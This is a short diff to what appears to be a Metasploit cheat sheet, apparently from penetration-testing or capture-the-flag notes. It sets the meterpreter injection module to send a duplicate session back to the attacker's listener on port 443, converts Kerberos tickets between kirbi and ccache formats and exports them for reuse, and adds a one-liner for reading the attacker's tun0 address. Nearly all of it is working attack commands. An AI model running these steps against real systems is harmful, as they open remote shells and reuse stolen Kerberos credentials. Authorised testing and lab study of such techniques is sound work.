@@ -17,7 +17,7 @@ set RHOST <TARGET_IP>
 
 # duplicate meterpreter session start background multi/handler first 
 use post/windows/manage/multi_meterpreter_inject
-set iplist <VICTIM_IP>
+set iplist <LHOST>
 set lport 443
 set payload <PAYLOAD>
 set session <SESSION>
@@ -28,3 +28,5 @@ use admin/kerberos/ticket_converter
 run inputpath=ticket.kirbi outputpath=ticket.ccache
 run inputpath=ticket.ccache outputpath=ticket.kirbi
 export KRB5CCNAME=$PWD/ticket.ccache
+
+$ LHOST: ip -f inet addr show tun0 | sed -En -e 's/.*inet ([0-9.]+).*/\1/p'
